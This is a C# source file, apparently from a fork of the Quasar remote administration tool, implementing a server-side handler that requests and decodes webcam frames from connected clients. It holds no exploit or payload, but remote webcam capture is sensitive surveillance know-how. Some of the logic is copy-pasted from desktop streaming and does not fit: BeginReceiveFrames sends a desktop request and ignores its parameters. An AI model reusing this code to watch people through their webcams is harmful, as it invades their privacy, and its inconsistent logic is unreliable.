using Mono.Cecil.Cil;
using Org.BouncyCastle.Bcpg;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Quasar.Server.Messages
{
    internal class RemoteWebcamHandlerS : MessageProcessorBase<Bitmap>, IDisposable
    {
        public RemoteWebcamHandlerS(Client client) : base(true)
        {
            _client = client;
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshDisplays()
        {
            _client.Send(new GetWebcams());
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="quality">The quality of the remote desktop frames.</param>
        /// <param name="display">The display to receive frames from.</param>
        public void BeginReceiveFrames(int quality, int display)
        {
            lock (_syncLock)
            {
                IsStarted = true;
                _codec?.Dispose();
                _codec = null;
                _client.Send(new GetDesktop { });
            }
        }

        /// <summary>
        /// States if the client is currently streaming desktop frames.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// The client which is associated with this startup manager handler.
        /// </summary>
        public readonly Client _client;
        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _sizeLock = new object();

        /// <summary>
        /// The local resolution, see <seealso cref="LocalResolution"/>.
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
        /// </summary>
        /// <remarks>
        /// This property is thread-safe.
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        /// <summary>
        /// The video stream codec used to decode received frames.
        /// </summary>
        private UnsafeStreamCodec _codec;

        /// <summary>
        /// Represents the method that will handle display changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="value">All currently available displays.</param>
        public delegate void DisplaysChangedEventHandler(object sender, Dictionary<string, List<Resolution>> value);

        /// <summary>
        /// Raised when a display changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks> 
        public event DisplaysChangedEventHandler DisplaysChanged;

        /// <summary>
        /// Reports changed displays.
        /// </summary>
        /// <param name="value">All currently available displays.</param>
        private void OnDisplaysChanged(GetWebcamsResponse value)
        {
            SynchronizationContext.Post(val =>
            {
                DisplaysChangedEventHandler handler = DisplaysChanged;
                handler?.Invoke(this, (Dictionary<string, List<Resolution>>)val);
            }, value.Webcams);
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
            }
        }

        public override bool CanExecute(IMessage message) => message is GetWebcamResponse || message is GetWebcamsResponse;
        
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender); //inheritdoc

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcamResponse d:
                    Execute(sender, d);
                    break;
                case GetWebcamsResponse m:
                    Execute(sender, m);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcamResponse message)
        {
            lock (_syncLock)
            {
                using (MemoryStream ms = new MemoryStream(message.Image))
                {
                    //Bitmap img = new Bitmap(ms);
                    //client.Value.FrmWebcam.UpdateImage(img);
                    OnReport(new Bitmap(ms));
                }
                message.Image = null;
                client.Send(new GetWebcam { Webcam = message.Webcam, Resolution = message.Resolution });
            }

                
        }
        private void Execute(ISender client, GetWebcamsResponse message)
        {
            OnDisplaysChanged(message);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    IsStarted = false;
                }
            }
        }

    }
}
